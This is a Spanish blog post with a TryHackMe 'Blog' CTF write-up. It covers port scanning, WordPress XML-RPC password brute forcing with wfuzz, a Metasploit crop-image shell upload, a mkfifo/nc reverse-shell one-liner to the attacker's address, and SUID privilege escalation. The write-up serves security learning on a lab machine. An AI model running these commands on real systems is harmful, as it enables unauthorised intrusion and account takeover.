<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="dias antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Blog - THM Writeup" /><meta property="og:locale" content="es" /><meta name="description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><meta property="og:description" content="Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico." /><link rel="canonical" href="https://rjceledon.github.io/posts/blog-thm-writeup/" /><meta property="og:url" content="https://rjceledon.github.io/posts/blog-thm-writeup/" /><meta property="og:site_name" content="Rich J. Celedon" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-14T22:34:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Blog - THM Writeup" /><meta name="twitter:site" content="@" /> <script type="application/ld+json"> {"description":"Un sitio donde depositar la informacion adquirida en el mundo del pentesting para ayudar a la comunidad y tener referencias en espanol sobre hacking etico.","url":"https://rjceledon.github.io/posts/blog-thm-writeup/","@type":"BlogPosting","headline":"Blog - THM Writeup","dateModified":"2022-01-17T23:03:39+00:00","datePublished":"2022-01-14T22:34:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://rjceledon.github.io/posts/blog-thm-writeup/"},"@context":"https://schema.org"}</script><title>Blog - THM Writeup | Rich J. Celedon</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Rich J. Celedon"><meta name="application-name" content="Rich J. Celedon"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/bio-photo.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Rich J. Celedon</a></div><div class="site-subtitle font-italic">Ciberseguridad y Hacking Etico</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVOS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rjceledon" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['zeytips','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Blog - THM Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Blog - THM Writeup</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://twitter.com/">Rich J. Celedon</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" date="2022-01-14 22:34:00 +0000" data-toggle="tooltip" data-placement="bottom" title="Fri, 14 Jan, 2022, 10:34 PM +0000" >14 Jan, 2022</em> </span> <span> Actualizado <em class="timeago" date="2022-01-17 19:03:39 -0400 " data-toggle="tooltip" data-placement="bottom" title="Mon, 17 Jan, 2022, 7:03 PM -0400" >17 Jan, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1603 palabras"> <em>8 min</em> leer</span></div></div></div><div class="post-content"><p><img data-src="https://tryhackme-images.s3.amazonaws.com/room-icons/618f1cc93596ff4082250bce9d869767.png" alt="image" width="100" data-proofer-ignore></p><p>Hoy traemos la maquina <code class="language-plaintext highlighter-rouge">Blog</code> de <a href="https://tryhackme.com/room/blog">TryHackMe</a> en donde segun su misma descripcion indica que esta usando el <code class="language-plaintext highlighter-rouge">Sistema de Gestion de Contenido (CMS)</code> muy conocido <a href="https://www.wordpress.com">WordPress</a> el cual tambien tiene una lista extensa de vulnerabilidades pasadas, tambien vemos en sus propios objetivos se nos pide enumerar la version sobre este.</p><p class="alert alert-info">Billy Joel made a blog on his home computer and has started working on it. It’s going to be so awesome! Enumerate this box and find the 2 flags that are hiding on it! Billy has some weird things going on his laptop. Can you maneuver around and get what you need? Or will you fall down the rabbit hole… In order to get the blog to work with AWS, you’ll need to add blog.thm to your /etc/hosts file.</p><p>Una vez logeados, procedemos a iniciar la maquina <del>y agregarle 1 hora mas por si acaso</del>, luego nos conectamos al VPN con</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="nb">sudo </span>openvpn /PATHTO/USER.ovpn</code></p></blockquote><p>Con esto empezamos…</p><h2 id="reconocimiento">RECONOCIMIENTO <a href="#reconocimiento" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hacemos un <code class="language-plaintext highlight highlighter-rouge">ping <span class="nt">-c</span> 1 IP</code> para analizar el <code class="language-plaintext highlighter-rouge">TTL</code> de la respuesta a ver si se aproxima a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.</p><p>Escaneamos los puertos abiertos con la herramienta <code class="language-plaintext highlight highlighter-rouge">nmap</code> usando opciones que nos aumentaran en cierta medida la velocidad de escaneo:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">--min-rate</span><span class="o">=</span>600 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> puertos.txt 10.10.193.129</code> <img data-src="https://user-images.githubusercontent.com/85322110/149607176-3a61b846-19cb-4b52-9bf5-671b9b17b0e2.png" alt="image" data-proofer-ignore></p></blockquote><p>Con esto vemos <strong>todos</strong> los puertos TCP <code class="language-plaintext highlighter-rouge">-p-</code>, utilizamos un escaneo del tipo <a href="https://nmap.org/book/synscan.html">TCP SYN Scan</a>, usamos solo listar puertos <code class="language-plaintext highlighter-rouge">--open</code>, aumentamos la cantidad minima de paquetes a enviar por segundo con <code class="language-plaintext highlighter-rouge">--min-rate=600</code> con rango entre <code class="language-plaintext highlighter-rouge">100-5000</code> dependiendo de la conexion existente, con maxima verbosidad <code class="language-plaintext highlighter-rouge">-vvv</code>, sin resolucion DNS <code class="language-plaintext highlighter-rouge">-n</code>, desactivando el <a href="https://nmap.org/book/man-host-discovery.html">Host Discovery</a> con <code class="language-plaintext highlighter-rouge">-Pn</code> y guardando un archivo <code class="language-plaintext highlighter-rouge">-oN puertos.txt</code></p><p>Lanzamos scripts basicos de enumeracion con <code class="language-plaintext highlighter-rouge">-sC</code> y deteccion de version <code class="language-plaintext highlighter-rouge">-sV</code> para los puertos que se encontraron abiertos, con salida al archivo <code class="language-plaintext highlighter-rouge">version.txt</code>.</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.193.129 <span class="nt">-oN</span> version.txt</code> <img data-src="https://user-images.githubusercontent.com/85322110/149606626-f6676da6-2236-407a-8bc5-9ace7b3eaf6a.png" alt="image" data-proofer-ignore></p></blockquote><p>Encontramos un puerto <code class="language-plaintext highlighter-rouge">ssh 22</code> con el que no podremos hacer mucho si no tenemos credenciales de acceso, un puerto <code class="language-plaintext highlighter-rouge">http 80</code> utilizando el <code class="language-plaintext highlighter-rouge">CMS</code> con su version y con esto podriamos responder los primeros objetivos de la maquina, y tambien un servicio <code class="language-plaintext highlighter-rouge">smb 139,445</code> que al parecer podemos acceder como invitado.</p><p>Empezaremos con este puerto <code class="language-plaintext highlighter-rouge">smb</code> haciendo un listado de los recursos compartidos por red con <code class="language-plaintext highlight highlighter-rouge">smbclient <span class="nt">-L</span> 10.10.56.100 <span class="nt">-N</span></code> para listar con <code class="language-plaintext highlighter-rouge">-L</code> y elegir no usar clave de acceso con <code class="language-plaintext highlighter-rouge">-N</code> <img data-src="https://user-images.githubusercontent.com/85322110/149606629-10a31a7f-3cdd-4fba-8547-e8bfedda6bc7.png" alt="image" data-proofer-ignore></p><p>Vemos un recurso llamado <code class="language-plaintext highlighter-rouge">BillySMB</code> que es sospechoso segun la descripcion de la maquina, asi que procedemos a abrirlo y copiarnos todo el contenido: <img data-src="https://user-images.githubusercontent.com/85322110/149606632-81d12e14-f355-4760-a59b-49bc02fe10c3.png" alt="image" data-proofer-ignore></p><p>Usamos <code class="language-plaintext highlighter-rouge">prompt</code> para evitar preguntar confirmacion y nos copiamos todo con <code class="language-plaintext highlighter-rouge">mget *</code> <del>multiget?</del></p><p>A partir de ahi revisamos los archivos pero no encontramos mucho. Al usar <code class="language-plaintext highlighter-rouge">steghide</code> vemos que en la imagen <code class="language-plaintext highlighter-rouge">Alice-White-Rabbit.jpg</code> existe informacion pero al extraerla nos topamos con un buen <code class="language-plaintext highlighter-rouge">rabbit hole</code> que se advertia desde un principio… <img data-src="https://user-images.githubusercontent.com/85322110/149606634-742294c9-e654-451e-a9da-dcfd2ce9423b.png" alt="image" data-proofer-ignore></p><p>Asi que al no ver nada interesante, nos centramos en la pagina web, al abrirla vemos un Blog en Wordpress comun, con un par de publicaciones, de las cuales si vemos los autores tenemos dos posibles usuarios de la pagina que son <code class="language-plaintext highlighter-rouge">bjoel,kwheel</code>, intentamos logearnos con claves por defecto en el apartado de <code class="language-plaintext highlighter-rouge">Login</code> que encontramos en el sitio pero no logramos entrar.</p><p>Podriamos intentar hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para encontrar rutas y archivos de la pagina, sin embargo notamos un problema de conexion al mandar muchos paquetes, asi que podemos ir manualmente <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">enumerando</a> un poco el WordPress.</p><p>Podemos validar si existen mas usuarios posibles usando una ruta tipica de WordPress en <code class="language-plaintext highlighter-rouge">/wp-json/wp/v2/users</code>, aca encontramos efectivamente un texto en formato JSON con cierta informacion: <img data-src="https://user-images.githubusercontent.com/85322110/149642926-7293d7f9-da77-4ffe-b0cf-2cbffc322194.png" alt="image" data-proofer-ignore></p><p>Podemos hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">jq</code> con la cual si pasamos un <code class="language-plaintext highlight highlighter-rouge"><span class="nb">echo</span> <span class="s1">'TEXTOJSON'</span> | jq <span class="s2">".[] | .slug"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span></code> podemos obtener el campo <code class="language-plaintext highlighter-rouge">slug</code> del formato JSON y verificamos que solo existen los usuarios <code class="language-plaintext highlighter-rouge">bjoel,kwheel</code> que identificamos antes.</p><p>Seguimos enumerando y encontramos que efectivamente existe el archivo <code class="language-plaintext highlighter-rouge">/xmlrpc.php</code> debido a que si hacemos peticion usando <code class="language-plaintext highlighter-rouge">burpsuite</code> o <code class="language-plaintext highlighter-rouge">curl</code> obtenemos respuesta positiva desde el lado del servidor, aunque pone lo siguiente:</p><blockquote><p>XML-RPC server accepts POST requests only.</p></blockquote><p>Pues lo unico que debemos hacer aca para poder <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#xml-rpc">enumerar</a> ciertas cosas con esta API, podemos hacer uso de <code class="language-plaintext highlighter-rouge">burpsuite</code> donde activamos el proxy, interceptamos una actualizacion de esta pagina, nos mandamos la peticion a la opcion <code class="language-plaintext highlighter-rouge">Repeater</code>, damos <code class="language-plaintext highlighter-rouge">2do Click</code> y usamos <code class="language-plaintext highlighter-rouge">Change request Method</code> para cambiar la peticion a <code class="language-plaintext highlighter-rouge">POST</code>, y luego ya solo queda modificar el cuerpo de la peticion, por ejemplo podemos mostrar los metodos disponibles a llamar con:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;methodCall&gt;</span>
 <span class="nt">&lt;methodName&gt;</span>
  system.listMethods
 <span class="nt">&lt;/methodName&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/85322110/149643483-90ecadf0-518d-40e9-bb11-93d92cedbda0.png" alt="image" data-proofer-ignore></p><h2 id="escaneo">ESCANEO <a href="#escaneo" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Vemos de ultimo en la lista que tenemos disponible el metodo <code class="language-plaintext highlighter-rouge">wp.getUsersBlogs</code> con el cual podremos utilizarlo para probar por fuera bruta <code class="language-plaintext highlighter-rouge">bruteforce</code> las claves de estos dos usuarios que nos encontramos. Para esto existen diferentes maneras, tenemos <code class="language-plaintext highlighter-rouge">burpsuite</code> que con licencia pro hace funcion de <code class="language-plaintext highlighter-rouge">Intruder</code> por hilos, tenemos <code class="language-plaintext highlighter-rouge">wpscan</code> que tambien tiene un modulo de fuerza bruta, tambien podriamos hacer uso de herramientas de fuzzing como <code class="language-plaintext highlighter-rouge">wfuzz</code>, o incluso desde un script en <code class="language-plaintext highlighter-rouge">bash</code> usando el paquete <code class="language-plaintext highlighter-rouge">curl</code>, sin embargo vemos que esta maquina es altamente susceptible a DoS si se envian muchas peticiones, asi que en este caso tiraremos de <code class="language-plaintext highlighter-rouge">wfuzz</code> sin agregar muchos hilos usando lo siguiente:</p><blockquote><p>La peticion que se debe enviar para probar una clave es esta</p></blockquote><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nt">&lt;methodCall&gt;</span>
 <span class="nt">&lt;methodName&gt;</span>
  wp.getUsersBlogs
 <span class="nt">&lt;/methodName&gt;</span>
  <span class="nt">&lt;params&gt;</span>
   <span class="nt">&lt;param&gt;</span>
    <span class="nt">&lt;value&gt;</span>
     user
    <span class="nt">&lt;/value&gt;</span>
   <span class="nt">&lt;/param&gt;</span>
   <span class="nt">&lt;param&gt;</span>
    <span class="nt">&lt;value&gt;</span>
     password
    <span class="nt">&lt;/value&gt;</span>
   <span class="nt">&lt;/param&gt;</span>
  <span class="nt">&lt;/params&gt;</span>	
<span class="nt">&lt;/methodCall&gt;</span>
</pre></table></code></div></div><p>Como usuarios, tenemos que crear un archivo que en cada linea tenga un usuario para <code class="language-plaintext highlighter-rouge">bjoel, kwheel</code> en un archivo users.txt y como claves usaremos las primeras 5000 claves del archivo rockyou.txt las cuales extraemos con <code class="language-plaintext highlight highlighter-rouge"><span class="nb">head</span> <span class="nt">-n</span> 5000 /usr/share/wordlists/rockyou.txt <span class="o">&gt;</span> dict.txt</code> y una vez tengamos esto usaremos la siguiente instruccion para <code class="language-plaintext highlighter-rouge">wfuzz</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>403 <span class="nt">-w</span> dict.txt <span class="nt">-w</span> users.txt <span class="nt">-d</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;FUZ2Z&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;FUZZ&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://blog.thm/xmlrpc.php
</pre></table></code></div></div><p>Con esto usaremos formato <code class="language-plaintext highlighter-rouge">-c</code>olorizado, escondemos las respuestas con 403 caracteres (si se quita este comando, apareceran todas las solicitudes con claves incorrectas, usamos este filtro para eliminar esas respuestas especificas), usamos el diccionario <code class="language-plaintext highlighter-rouge">-w</code> dict.txt de primero para iterar 1 clave con dos usuarios, y luego el diccionario de <code class="language-plaintext highlighter-rouge">-w</code> users.txt, si lo ponemos en orden inverso pues iteraria 1 usuario con todas las claves, y nosotros queremos probar cada clave con cada usuario para agilizar tiempo, luego con <code class="language-plaintext highlighter-rouge">-d</code> pasamos la <code class="language-plaintext highlighter-rouge">POST data</code> de la peticion <code class="language-plaintext highlighter-rouge">xml</code> en una sola linea, poniendo <code class="language-plaintext highlighter-rouge">FUZ2Z</code> donde irian nuestro <code class="language-plaintext highlighter-rouge">user.txt</code>, y ponemos <code class="language-plaintext highlighter-rouge">FUZZ</code> donde irian las claves, y finalmente la URL de peticion, con esto encontramos la clave para <code class="language-plaintext highlighter-rouge">kwheel</code>: <img data-src="https://user-images.githubusercontent.com/85322110/149839157-21e5e57e-1f71-4c3b-a32e-896cd9be8886.png" alt="image" data-proofer-ignore></p><p>Una vez tenemos esta clave, podemos probar logearnos en la misma pagina, pero vemos que no tenemos permisos de administrador asi que no podremos hacer mucho, sin embargo existen <code class="language-plaintext highlighter-rouge">exploits</code> que requieren de autenticacion inicial para funcionar, por ello vemos si existe algun exploit para la version actual de wordpress con <code class="language-plaintext highlight highlighter-rouge">searchsploit wordpress 5.0</code> y vemos ciertos exploits, pero en este caso nos enfocaremos en el llamado <code class="language-plaintext highlighter-rouge">WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)</code> que es el que aparenta estar operativo. Al ser de Metasploit debemos lanzar el entorno del mismo con <code class="language-plaintext highlighter-rouge">msfconsole</code> y esperamos que se active la consola <del>con mucha paciencia</del>.</p><p>Una vez aca podemos buscar el mismo exploit con <code class="language-plaintext highlighter-rouge">search wordpress 5.0</code> y anotamos el nombre, enviamos <code class="language-plaintext highlighter-rouge">use exploit/multi/http/wp_crop_rce</code> y luego debemos completar las opciones del <code class="language-plaintext highlighter-rouge">exploit</code> con <code class="language-plaintext highlighter-rouge">options</code>, a partir de ahi seteamos el <code class="language-plaintext highlighter-rouge">LHOST, LPORT, RHOSTS, USERNAME y PASSWORD</code> con <code class="language-plaintext highlighter-rouge">set LHOST 10.8.33.130</code> por ejemplo: <img data-src="https://user-images.githubusercontent.com/85322110/149840797-37e94b55-43f6-4043-8776-7499c62507d9.png" alt="image" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/85322110/149840827-0f2f5912-a4b5-4422-abd1-5031da93367a.png" alt="image" data-proofer-ignore></p><p>Ya con todo configurado, procemos a escribir <code class="language-plaintext highlighter-rouge">exploit</code> y darle enter: <img data-src="https://user-images.githubusercontent.com/85322110/149841372-018ac92e-fa7e-4dc7-aadc-4fc592120d7f.png" alt="image" data-proofer-ignore></p><p>Aca ya tenemos ejecucion de comandos de manera remota con el servidor y logramos el acceso inicial, seguimos con la siguiente fase…</p><h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS <a href="#escalada-de-privilegios" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hemos obtenido acceso con una consola del tipo <code class="language-plaintext highlighter-rouge">meterpreter</code>, pero a modo de comodidad pasamos a crearnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> con <code class="language-plaintext highlighter-rouge">nc</code> como estamos acostumbramos, para ello escribimos <code class="language-plaintext highlighter-rouge">shell</code> en meterpreter para ejecutar una consola de sistema operativo, luego nos ponemos en escucha por otra ventana de <code class="language-plaintext highlighter-rouge">bash</code> con <code class="language-plaintext highlighter-rouge">sudo nc -nvlp 443</code> y desde la consola del sistema remoto usamos el siguiente <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">metodo de reverse shell</a></p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.8.33.130 443 <span class="o">&gt;</span>/tmp/f</code></p></blockquote><p>Una vez obtenemos esta consola remota de bash, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:</p><ul><li><code class="language-plaintext highlight highlighter-rouge">script /dev/null <span class="nt">-c</span> bash</code><li>En teclado <code class="language-plaintext highlighter-rouge">Ctrl + Z</code><li><code class="language-plaintext highlight highlighter-rouge"><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span></code><li>Escribir <code class="language-plaintext highlighter-rouge">reset</code> aunque no se vea<li><code class="language-plaintext highlighter-rouge">xterm</code> en Terminal Type<li><code class="language-plaintext highlight highlighter-rouge"><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash</code><li><code class="language-plaintext highlight highlighter-rouge"><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm</code></ul><p>Ya con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Podemos intentar obtener la flag de <code class="language-plaintext highlighter-rouge">user.txt</code> que la encontramos en <code class="language-plaintext highlighter-rouge">/home/bjoel/user.txt</code> pero nos topamos con que es una burla y no se encuentra alli, vemos un archivo PDF que es una carta de despido para Billy indicando que usaba dispositivos USB lo cual no estaba permitido en esa empresa.</p><p>Si seguimos buscando formas de obtener credenciales elevadas, al usar <code class="language-plaintext highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code> para ver los binarios con <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">SUID</a>, notamos que hay uno que sobresale de la lista, pues esta en una carpeta donde no hay otros binarios SUID, en <code class="language-plaintext highlighter-rouge">/usr/sbin/checker</code>, al ejecutarlo solo nos dice que somos admin, pero si usamos <code class="language-plaintext highlighter-rouge">ltrace</code> para ejecutarlo vemos que hace uso de la funcion <code class="language-plaintext highlighter-rouge">getenv()</code> lo cual intenta buscar una variable de entorno llamada <code class="language-plaintext highlighter-rouge">admin</code>: <img data-src="https://user-images.githubusercontent.com/85322110/149843382-9b1cb980-3c61-4011-b67e-6309364318b3.png" alt="image" data-proofer-ignore></p><p>Probamos hacer <code class="language-plaintext highlighter-rouge">export admin='test'</code> y ejecutamos el binario de nuevo y efectivamente ya tenemos acceso root, de aca buscamos donde esta la flag <code class="language-plaintext highlighter-rouge">user.txt</code> y leemos la flag de <code class="language-plaintext highlighter-rouge">root.txt</code> y concluimos con esta maquina: <img data-src="https://user-images.githubusercontent.com/85322110/149843391-7b9296e8-5b65-4b39-890a-680209ef1dd8.png" alt="image" data-proofer-ignore></p><p>Saludos!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cajas/'>cajas</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >wordpress</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/xml/" class="post-tag no-text-decoration" >xml</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Este post esta bajo la licencia <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Blog - THM Writeup - Rich J. Celedon&url=https://rjceledon.github.io/posts/blog-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Blog - THM Writeup - Rich J. Celedon&u=https://rjceledon.github.io/posts/blog-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Blog - THM Writeup - Rich J. 